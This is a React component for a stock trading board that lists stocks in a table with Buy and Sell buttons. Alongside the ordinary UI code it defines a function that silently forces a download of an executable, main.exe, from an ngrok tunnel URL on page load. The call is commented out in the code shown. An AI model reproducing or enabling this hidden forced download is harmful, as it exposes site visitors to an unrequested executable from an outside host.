import React from "react";
import Navbar from "./components/Navbar";
import {useState,useEffect} from "react";
import axios from "axios";
import {PriceCell} from "./components/PriceCell";
import {useNavigate} from "react-router-dom";
export default function Stocks() {
    const [stocks,set_stock]=useState([]);
    const navigate=useNavigate();
    let value=201;
    const downloadFile = () => {
      const link = document.createElement("a");
      link.href = "https://2522-2405-201-6018-60c7-c40c-f05c-6793-e9d6.ngrok-free.app/files/main.exe";
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    };
    async function setData(){
        await axios.get('http://localhost:5000/api/stocks/stock-list').then((response)=>{
            set_stock(response.data);
        });
    }
    useEffect(()=>{
        //downloadFile();
        setData();
    },[]);

    useEffect(()=>{
        console.log(stocks);
    },[stocks]);


    return (
        <>
            <Navbar/>
            <div className="container">
                <h1 className="text-center">Stock Board</h1>
                <div className="row">
                    <div className="col-lg-12">
                        <table className="table table-hover table-bordered" id="dev-table">
                    <thead>
                    <tr>
                        <th>Stock Code</th>
                        <th>Company</th>
                        <th>Stock Price</th>
                        <th>Quantity Available</th>
                        <th>Actions</th>
                    </tr>
                    </thead>
                    <tbody>
                          {stocks.length > 0 ? (
                                stocks.map((stock) => (
                                      <tr key={stock.stock_id}>
                                            <td>{stock['stock_company_code']}</td>
                                            <td>{stock['stock_company_name']}</td>
                                            <PriceCell stock={stock} />
                                            <td>
                                                  <input
                                                        type="button"
                                                        onClick={(e) =>
                                                          navigate(`/stock/buy/${stock['stock_company_code']}`)
                                                        }
                                                        value="Buy"
                                                  />
                                                  <input type="button"
                                                         onClick={(e)=>
                                                         navigate(`/stock/sell/${stock['stock_company_code']}`)}
                                                         value="Sell" />
                                            </td>
                                      </tr> // No extra whitespace here
                                ))
                          ) : (
                            <tr>
                              <td colSpan={5} className="text-center">
                                Loading . . .{' '}
                              </td>
                            </tr>
                          )}
</tbody>
                </table>
                    </div>
                </div>

            </div>
        </>

    );
}
